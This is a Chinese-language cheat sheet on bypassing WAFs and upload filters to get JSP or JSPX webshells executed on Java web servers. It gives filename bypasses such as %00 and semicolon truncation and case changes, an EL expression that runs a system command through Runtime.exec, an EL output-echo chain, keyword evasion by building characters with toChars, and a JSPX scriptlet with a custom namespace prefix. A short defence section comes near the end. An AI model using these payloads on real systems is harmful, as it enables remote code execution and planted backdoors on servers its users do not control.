# 文件上传漏洞绕过WAF-JSP

## 一句话理解
JSP 上传绕过的重点，不只是“把文件传上去”，而是让上传内容最终被 Java Web 容器当成可执行页面解析，同时避开扩展名、内容特征和 WAF 的检测。

## 常见危害
- 上传 JSP WebShell 获得代码执行
- 借助 JSPX、EL、标签变形绕过内容检测
- 配合中间件解析差异实现二次执行
- 结合上传目录可访问、文件名可控、路径可控形成稳定后门

## 利用前提
常见成立条件：
- 存在文件上传点
- 上传目录可被 Web 容器访问
- 文件最终会被 JSP/JSPX 解析
- 扩展名校验、内容校验或 WAF 存在缺陷

## 常见绕过方向
### 1. 扩展名绕过
如果系统只依赖黑名单或 `Content-Type`，可尝试：
- 只限制 MIME：`Content-Type: image/png`
- 使用 `jspx`：`filename="re.jspx"`
- 大小写变形：`filename="re.JsP"`
- 后缀加空格：`filename="re.jsp "`
- 后缀加斜杠：`filename="re.jsp/"`
- `00` 截断：`filename="re.jsp%00.jpg"`
- 分号截断：`filename="re.jsp;.jpg"`

> `00` 截断是否有效，取决于语言、框架、中间件与后端处理链，不是所有环境都可用。

### 2. 文件内容绕过
若 WAF 或过滤逻辑检测经典 JSP 片段，可尝试：
- 添加大量脏数据稀释特征
- 变换 JSP 语法
- 使用 EL 表达式
- 使用 JSPX XML 风格标签

## 当 JSP `<% %>` 被过滤
### 1. 用 EL 表达式 `${}`
如果 `<% %>`、`<%= %>` 等经典脚本片段被拦截，可以尝试 EL 表达式执行能力。

参考：
- [EL 文档](https://www.tutorialspoint.com/jsp/jsp_expression_language.htm)
- [EL 常见写法](https://javaee.github.io/tutorial/jsf-el007.html)

常用对象：

```java
pageContext.setAttribute("name1","test");
request.setAttribute("name2","test");
session.setAttribute("name3","test");
application.setAttribute("name4","test");
```

### 2. 命令执行示例

```java
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami").getInputStream())}
```

### 3. 带回显思路

```java
${pageContext.setAttribute("byteArrType", heapByteBuffer.array().getClass())}
${pageContext.setAttribute("stringClass", Class.forName("java.lang.String"))}
${pageContext.setAttribute("stringConstructor", stringClass.getConstructor(byteArrType))}
${pageContext.setAttribute("stringRes", stringConstructor.newInstance(heapByteBuffer.array()))}
${pageContext.getAttribute("stringRes")}
```

> 实战中这类 payload 往往依赖当前页面对象、缓冲对象或上下文对象可达，不同环境可用性不同。

### 4. 字符限制绕过
当引号、字母或敏感关键字被过滤时，可借助 `charAt`、`toChars`、`concat` 等方式逐字符构造：

```java
${"xxx".toString().charAt(0).toChars(97)[0].toString()}
${"xxx".toString().charAt(0).toChars(97)[0].toString().concat("xxx".toString().charAt(0).toChars(98)[0].toString())}
```

通过修改 `toChars()` 中的 ASCII 码值，可拼出目标字符串。

## 当 JSPX `jsp:scriptlet` 被过滤
JSPX 是 XML 风格的 JSP 表示形式，某些过滤器只拦截固定标签名时，可以尝试使用自定义前缀。

示例：

```xml
<hi xmlns:hi="http://java.sun.com/JSP/Page">
    <hi:scriptlet>
        out.println(30*30);
    </hi:scriptlet>
</hi>
```

核心思路：
- 命名空间不变
- 标签前缀可自定义
- 过滤器若只匹配 `jsp:scriptlet` 字面值，可能被绕过

## 实战排查思路
### 1. 先确认解析链
重点看：
- 上传目录是否可访问
- 文件是否由 Tomcat / Resin / Jetty 等容器直接处理
- JSP 与 JSPX 是否都可解析

### 2. 再确认拦截点
判断校验是在：
- 前端
- 应用层
- WAF
- 反向代理
- 容器层

### 3. 最后选择绕过方向
优先顺序通常是：
1. 扩展名绕过
2. 内容绕过
3. 语法变形
4. JSPX / EL 变体

## 防御要点
### 1. 上传目录禁止脚本执行
这是最关键的一条。上传目录不能交给 JSP 解析器执行。

### 2. 严格白名单
仅允许业务所需的文件类型，且服务端重新命名。

### 3. 多维校验
同时检查：
- 扩展名
- 内容类型
- 文件头
- 实际解析结果

### 4. 不依赖关键字黑名单
只拦截 `<%`、`jsp:scriptlet` 或 `Runtime` 这类关键字，通常很容易被变形绕过。

## 速查清单
- 先看上传目录是否能被 JSP/JSPX 解析
- 先试扩展名绕过，再试 EL、JSPX、标签变体
- 检查 WAF 是否只做关键字拦截
- 检查是否存在大小写、空格、斜杠、分号、截断类差异
- 若 `JSP` 被杀，继续看 `JSPX`、EL、标签前缀变体

## Reference
1. [记一次绕过 waf 的任意文件上传](https://xz.aliyun.com/t/11337)
2. [普通 EL 表达式命令回显的简单研究](https://forum.butian.net/share/886)
